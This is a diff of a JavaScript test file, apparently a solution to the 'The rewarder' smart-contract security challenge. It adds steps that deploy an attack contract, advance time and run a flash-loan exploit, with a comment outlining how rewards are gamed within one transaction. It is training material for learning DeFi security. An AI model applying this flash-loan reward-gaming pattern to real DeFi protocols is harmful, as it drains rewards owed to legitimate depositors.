@@ -9,6 +9,9 @@ const AccountingToken = contract.fromArtifact('AccountingToken');
 
 const { expect } = require('chai');
 
+// Attack contract
+const AttackContract = contract.fromArtifact('Attack');
+
 describe('[Challenge] The rewarder', function () {
 
     const [deployer, alice, bob, charlie, david, attacker, ...otherAccounts] = accounts;
@@ -61,14 +64,30 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        /**
+         * This attack is a standard flash-loan
+         * It needs an attack contract
+         * to borrow tokens, deposit, gets the reward, then withdraw
+         * then returns the borrowed tokens to the lender.
+         * at the same transaction.
+         */
+        // deploy attack contract
+        this.attackContract = await AttackContract.new(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address, { from: attacker });
+
+        // Advance time 5 days so that depositors can get rewards
+        await time.increase(time.duration.days(5));
+
+        // execute the attack
+        await this.attackContract.executeLoan({ from: attacker });
     });
 
     after(async function () {
+        
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
         ).to.be.bignumber.eq('3');
-
+        
         // Users should not get more rewards this round
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.distributeRewards({ from: users[i] });
@@ -80,5 +99,7 @@ describe('[Challenge] The rewarder', function () {
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.bignumber.gt(ether('100'));
         expect(await this.rewardToken.balanceOf(attacker)).to.be.bignumber.gt('0');
+
+        /***/
     });
 });
